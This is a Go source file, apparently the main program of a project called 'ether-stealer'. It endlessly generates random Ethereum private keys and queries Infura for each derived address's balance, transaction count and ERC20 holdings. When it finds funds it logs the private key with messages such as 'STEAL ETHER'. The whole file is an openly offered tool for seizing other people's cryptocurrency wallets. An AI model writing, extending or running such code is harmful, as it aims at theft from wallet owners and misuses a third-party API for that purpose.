package main

import (
	"fmt"
	"net"
	"os"
	"strconv"
	"strings"

	"github.com/ethereum/go-ethereum/common"

	"github.com/hexoul/ether-stealer/contract"
	"github.com/hexoul/ether-stealer/crypto"
	"github.com/hexoul/ether-stealer/json"
	"github.com/hexoul/ether-stealer/log"

	"github.com/korovkin/limiter"
)

const (
	urlForBalance = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getBalance?params=[\"%s\",\"latest\"]"
	urlForTxCount = "https://api.infura.io/v1/jsonrpc/mainnet/eth_getTransactionCount?params=[\"%s\",\"latest\"]"
)

var (
	nLimit int
	who    string
)

func get(baseURL, addr string) (b bool, val string) {
	url := fmt.Sprintf(baseURL, addr)
	ret, err := json.GetRPCResponseFromURL(url)
	if err != nil {
		fmt.Print("UNSTABLE NETWORK")
		return
	}

	switch ret.Result.(type) {
	case string:
		if val = ret.Result.(string); val != "0x0" {
			b = true
		}
	}
	return
}

func hasBalance(addr string) (b bool, val string) {
	return get(urlForBalance, addr)
}

func hasTxCount(addr string) (b bool, val string) {
	return get(urlForTxCount, addr)
}

func steal(addr common.Address, privkey []byte) {
	addrStr := addr.String()
	if canStealEther, _ := hasBalance(addrStr); canStealEther {
		log.Infof("STEAL ETHER from %s !!SECRET!! %x", addrStr, privkey)
	} else if canCandidate, _ := hasTxCount(addrStr); canCandidate {
		log.Infof("GOT CANDIDATE %s !!SECRET!! %x", addrStr, privkey)
	} else if canStealERC := contract.CanSteal(addr); canStealERC != "" {
		log.Infof("STEAL ERC20 from %s !!SECRET!! %x TARGET %s", addrStr, privkey, canStealERC)
	} else {
		fmt.Printf("FAILED from %s\n", addrStr)
	}
}

func init() {
	nLimit = 10
	for _, val := range os.Args {
		arg := strings.Split(val, "=")
		if len(arg) < 2 {
			continue
		} else if arg[0] == "-limiter" {
			if i, err := strconv.Atoi(arg[1]); err == nil {
				nLimit = i
			}
		} else if arg[0] == "-who" {
			who = arg[1]
		}
	}
}

func main() {
	// Starting message
	var ip string
	if addrs, err := net.InterfaceAddrs(); err == nil {
		for _, a := range addrs {
			if ipnet, ok := a.(*net.IPNet); ok && !ipnet.IP.IsLoopback() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}
	log.Info("Steal start!!! from ", ip, " ", who)

	limit := limiter.NewConcurrencyLimiter(nLimit)
	// If you want to run finite iterator,
	// 1. Add condition to `for` statement like `for i:0; i<`
	// 2. Put `limit.Wait()` after `for` statement
	for {
		pubkey, privkey := crypto.GenerateKeyPair()
		addr := crypto.ToAddressFromPubkey(pubkey)
		limit.Execute(func() { steal(addr, privkey) })
	}
}
